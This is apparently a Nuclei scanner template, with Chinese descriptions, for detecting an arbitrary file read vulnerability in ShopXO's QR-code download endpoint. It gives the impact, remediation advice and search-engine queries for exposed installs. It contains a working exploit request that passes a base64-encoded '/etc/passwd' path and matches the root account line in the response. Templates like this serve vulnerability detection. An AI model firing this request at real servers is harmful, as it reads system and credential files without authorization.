id: CNVD-2021-15822

info:
  name: ShopXO 任意文件读取漏洞（CNVD-2021-15822）
  author: pikpikcu
  severity: high
  description: |
    ShopXO 的二维码下载接口对 `url` 参数处理不当，攻击者可通过编码后的本地路径读取服务器文件。模板请求 `/index/qrcode/download` 读取 `/etc/passwd`，并匹配系统账号文件特征确认漏洞。
  impact: |
    - 攻击者可读取本地文件、应用配置和敏感凭据，进一步攻击电商后台或数据库。
    - 电商系统中的订单、会员、支付配置等敏感业务数据可能因此面临泄露风险。
  remediation: |
    - 升级 ShopXO 至修复版本，修复二维码下载接口对本地路径的访问控制。
    - 对下载目标使用协议白名单和路径白名单，禁止 `file`、绝对路径和目录穿越。
    - 检查服务器敏感文件权限，并轮换可能泄露的数据库和后台凭据。
  reference:
    - https://mp.weixin.qq.com/s/69cDWCDoVXRhehqaHPgYog
  classification:
    cpe: cpe:2.3:a:shopxo:shopxo:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    vendor: shopxo
    product: shopxo
    shodan-query: title:"ShopXO企业级B2C电商系统提供商"
    fofa-query: app="ShopXO企业级B2C电商系统提供商"
  tags: cnvd2021,cnvd,shopxo,lfi,vuln

http:
  - raw:
      - |
        GET /public/index.php?s=/index/qrcode/download/url/L2V0Yy9wYXNzd2Q=  HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "root:.*:0:0:"

      - type: status
        status:
          - 200
